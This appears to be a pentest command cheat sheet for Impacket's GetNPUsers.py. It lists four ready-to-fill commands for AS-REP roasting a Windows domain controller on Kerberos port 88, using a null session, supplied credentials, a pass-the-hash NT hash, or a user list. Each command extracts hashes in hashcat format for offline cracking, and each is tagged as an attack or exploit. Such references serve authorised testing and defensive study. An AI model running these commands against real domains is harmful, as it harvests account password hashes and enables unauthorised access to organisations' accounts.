# GetNPUsers (imp)

% impacket-kerberos, windows, kerberos, 88

## ASREPRoasting (null session)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py  -request -format hashcat -dc-ip <dc_ip> '<domain>/'
```

## ASREPRoasting (user account)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py  -request -format hashcat -dc-ip <dc_ip> '<domain>/<user>:<password>'
```


## ASREPRoasting (pth)
#plateform/linux #target/remote #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py  -request -format hashcat -dc-ip <dc_ip> -hashes :<nt_hash> '<domain>/<user>'
```

## ASREPRoasting (userlist)
#plateform/linux #target/remote  #cat/ATTACK/EXPLOIT 
```
GetNPUsers.py -dc-ip <dc_ip> <domain>/ -usersfile <users_file> -format hashcat
```
